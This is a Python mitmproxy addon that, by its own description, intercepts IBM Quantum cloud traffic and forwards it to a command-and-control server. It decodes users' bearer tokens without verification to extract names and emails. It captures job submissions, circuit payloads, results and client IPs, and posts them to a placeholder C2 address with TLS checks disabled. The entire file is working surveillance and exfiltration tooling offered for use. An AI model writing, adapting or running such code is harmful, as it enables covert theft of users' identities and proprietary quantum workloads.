#!/usr/bin/env python3
"""
IBM Quantum Monitor - Client Script
Captures quantum traffic and sends RAW data to C2 server for decoding
NO QISKIT REQUIRED ON CLIENT!
"""
from mitmproxy import http
import logging
from datetime import datetime
import json
import requests
import urllib3
from urllib.parse import urljoin
import jwt
import dotenv

# Disable SSL warnings for C2 communication
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

# Configuration
SERVER_PORT = "SERVER_PORT" # Replace with actual port of server before sending to client
SERVER_IP = "SERVER_IP" # Replace with actual IP of server before sending to client

BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"
DEFAULT_ENDPOINT = "/api/log"

TARGET_DOMAINS = ["ibm.com", "quantum-computing.ibm.com", "cloud.ibm.com"]


class QuantumTrafficCapture:
    """Simple traffic capture - sends raw data to C2 for decoding"""

    def __init__(self):
        print("\n" + "=" * 80)
        print("🚀 IBM Quantum Traffic Capture Starting...")
        print("=" * 80)
        print(f"📡 C2 Server: {BASE_URL}")
        print("🎯 Monitoring IBM Quantum traffic...")
        print("⚡ Job submissions: POST /jobs")
        print("🔬 Results: GET /results")
        print("=" * 80 + "\n")

        # Get and cache the real public IP
        self.public_ip = self._fetch_public_ip()
        print(f"🌐 Detected Public IP: {self.public_ip}\n")

        # Track pending jobs waiting for IBM's response
        self.pending_jobs = {}

        # Test C2 connection
        self._test_c2_connection()

    def _fetch_public_ip(self) -> str:
        """Fetch the real public IP address from external service"""
        # Try multiple services in case one is down
        services = [
            "https://api.ipify.org?format=json",
            "https://ipapi.co/json/",
            "https://ifconfig.me/ip",
        ]

        proxies = {"http": None, "https": None}

        for service in services:
            try:
                response = requests.get(service, timeout=5, proxies=proxies)
                if response.status_code == 200:
                    # Parse response based on service
                    if "ipify" in service:
                        return response.json()["ip"]
                    elif "ipapi" in service:
                        return response.json()["ip"]
                    else:  # ifconfig.me returns plain text
                        return response.text.strip()
            except Exception as e:
                continue

        # If all services fail, return unknown
        logger.info("⚠️  Could not fetch public IP, will use 'unknown'")
        return "unknown"

    def _test_c2_connection(self):
        """Test if C2 server is reachable"""
        try:
            proxies = {"http": None, "https": None}
            response = requests.get(
                urljoin(base=BASE_URL, url="/health"),
                timeout=5,
                verify=False,
                proxies=proxies,
            )
            if response.status_code == 200:
                print("✅ C2 server is reachable!\n")
            else:
                print(f"⚠️  C2 server returned status {response.status_code}\n")
        except Exception as e:
            print(f"⚠️  Could not reach C2 server: {e}")
            print("   Make sure C2 server is running!\n")

    def _get_real_client_ip(self, flow: http.HTTPFlow) -> str:
        """Get the real client IP address"""
        # Check X-Forwarded-For header first (if behind another proxy)
        if "X-Forwarded-For" in flow.request.headers:
            xff = flow.request.headers["X-Forwarded-For"]
            return xff.split(",")[0].strip()

        # Check other proxy headers
        if "X-Real-IP" in flow.request.headers:
            return flow.request.headers["X-Real-IP"]

        if "CF-Connecting-IP" in flow.request.headers:
            return flow.request.headers["CF-Connecting-IP"]

        if "True-Client-IP" in flow.request.headers:
            return flow.request.headers["True-Client-IP"]

        # If no proxy headers and connection is localhost, use cached public IP
        if flow.client_conn and flow.client_conn.address:
            conn_ip = flow.client_conn.address[0]
            if conn_ip in ("127.0.0.1", "::1", "localhost"):
                return self.public_ip
            return conn_ip

        # Final fallback to cached public IP
        return self.public_ip

    def send_to_c2(self, data):
        """Send data to C2 server"""
        try:
            proxies = {"http": None, "https": None}
            response = requests.post(
                urljoin(base=BASE_URL, url=DEFAULT_ENDPOINT), json=data, timeout=10, verify=False, proxies=proxies
            )

            if response.status_code == 200:
                print(f"   ✅ Sent to C2 server")
                return True
            else:
                print(f"   ⚠️  C2 returned status {response.status_code}")
                return False

        except Exception as e:
            print(f"   ❌ Failed to send to C2: {e}")
            return False

    def request(self, flow: http.HTTPFlow) -> None:
        """Handle HTTP requests"""
        if not self._is_target(flow):
            return

        # Check if this is a job submission (POST /jobs)
        path = flow.request.path.lower()
        is_job_submission = flow.request.method == "POST" and path.endswith("/jobs")

        if is_job_submission:
            logger.info(f"\n⚡ JOB SUBMISSION DETECTED")
            logger.info(f"   URL: {flow.request.pretty_url}")
            # Store the flow ID to track this job
            self._handle_job_submission(flow)

    def response(self, flow: http.HTTPFlow) -> None:
        """Handle HTTP responses"""
        if not self._is_target(flow):
            return

        # Check if this is a response to a job submission
        path = flow.request.path.lower()
        is_job_submission_response = flow.request.method == "POST" and path.endswith(
            "/jobs"
        )

        if is_job_submission_response:
            logger.info(f"\n📥 JOB SUBMISSION RESPONSE")
            logger.info(f"   Status: {flow.response.status_code}")
            self._handle_job_submission_response(flow)

        # Check if this is a results endpoint
        is_results_endpoint = "/results" in flow.request.path.lower()

        if is_results_endpoint:
            logger.info(f"\n🔬 RESULTS DETECTED")
            logger.info(f"   URL: {flow.request.pretty_url}")
            logger.info(f"   Status: {flow.response.status_code}")
            self._handle_results(flow)

    def _is_target(self, flow: http.HTTPFlow) -> bool:
        """Check if this is IBM Quantum traffic"""
        host = flow.request.pretty_host.lower()
        return any(domain.lower() in host for domain in TARGET_DOMAINS)

    def _handle_job_submission(self, flow: http.HTTPFlow):
        """Capture job submission and store for later update with real job ID"""
        try:
            auth = flow.request.headers.get("Authorization", "")
            if auth == "":
                raise ValueError("Header doesn't have Authorization attribute")

            token = auth.split(" ", 1)[1].strip()  # removes "Bearer "

            payload = jwt.decode(
                token,
                options={
                    "verify_signature": False,
                    "verify_exp": False,
                    "verify_aud": False,
                    "verify_iss": False,
                },
            )

            username = payload.get("name", "unknown")
            email = payload.get("email", "unknown")

            # Parse request body
            body = json.loads(flow.request.content)

            # Extract metadata
            backend = body.get("backend", "unknown")
            shots = body.get("shots", "unknown")

            # Check for shots in params
            params = body.get("params", {})
            if "pubs" in params and len(params["pubs"]) > 0:
                if isinstance(params["pubs"][0], list) and len(params["pubs"][0]) > 2:
                    shots = params["pubs"][0][2]

            # Get real client IP
            client_ip = self._get_real_client_ip(flow)

            # Store this job submission data with flow ID
            # We'll update it with the real job ID when we get the response
            self.pending_jobs[id(flow)] = {
                "timestamp": datetime.now().isoformat(),
                "client_ip": client_ip,
                "url": flow.request.pretty_url,
                "method": flow.request.method,
                "backend": backend,
                "shots": shots,
                "raw_body": body,
                "username": username,
                "email": email,
            }

        except Exception as e:
            logger.warning(f"   ⚠️ Error processing job submission: {e}")

    def _handle_job_submission_response(self, flow: http.HTTPFlow):
        """Handle response from IBM after job submission - captures the real Job ID"""
        try:
            flow_id = id(flow)

            # Check if we have pending data for this job
            if flow_id not in self.pending_jobs:
                logger.info(f"   ⚠️ No pending job data found for this response")
                return

            # Get the stored job data
            job_data = self.pending_jobs[flow_id]

            # Parse the response to get the Job ID
            response_body = json.loads(flow.response.content)

            # IBM typically returns job ID in 'id' field
            job_id = None
            if isinstance(response_body, dict):
                job_id = (
                    response_body.get("id")
                    or response_body.get("job_id")
                    or response_body.get("jobId")
                )

            if job_id:
                logger.info(f"   ✅ Got IBM Job ID: {job_id}")
            else:
                logger.info(f"   ⚠️ Could not extract Job ID from response")
                job_id = "unknown"

            # Now send to C2 with the REAL job ID
            data = {}

            data.update(job_data)
            data["type"] = "job_submission_raw"
            data["job_id"] = job_id  # Real IBM Job ID

            self.send_to_c2(data)

            # Clean up - remove from pending jobs
            del self.pending_jobs[flow_id]

        except Exception as e:
            logger.info(f"   ⚠️ Error processing job submission response: {e}")
            # Try to clean up anyway
            if flow_id in self.pending_jobs:
                del self.pending_jobs[flow_id]

    def _handle_results(self, flow: http.HTTPFlow):
        """Capture results and send RAW data to C2"""
        try:
            # Parse response body
            body = json.loads(flow.response.content)

            # Extract job ID from URL
            import re

            job_id = None
            url_match = re.search(r"/jobs/([^/]+)/results", flow.request.path)
            if url_match:
                job_id = url_match.group(1)
                logger.info(f"Job id from url_match (_handle_requests) = {job_id}")

            # Also try from response body
            if not job_id:
                logger.info("Job id not found from url_match (_handle_results)")
                if isinstance(body, dict):
                    job_id = body.get("id") or body.get("job_id")
                    logger.info(f"Job id found from response body: {job_id}")

            # Get real client IP
            client_ip = self._get_real_client_ip(flow)

            logger.info(f"   Job ID: {job_id if job_id else 'Not found'}")
            logger.info(f"   Client IP: {client_ip}")

            # Send RAW data to C2 (no decoding here!)
            data = {
                "type": "job_results_raw",
                "timestamp": datetime.now().isoformat(),
                "client_ip": client_ip,
                "url": flow.request.pretty_url,
                "status_code": flow.response.status_code,
                "job_id": job_id,
                "raw_body": body,  # Send entire raw body to C2
            }

            logger.info(f"Data variable from _handle_results = {data}")

            self.send_to_c2(data)

        except Exception as e:
            logger.info(f"   ⚠️ Error processing results: {e}")


# Initialize the addon
addons = [QuantumTrafficCapture()]
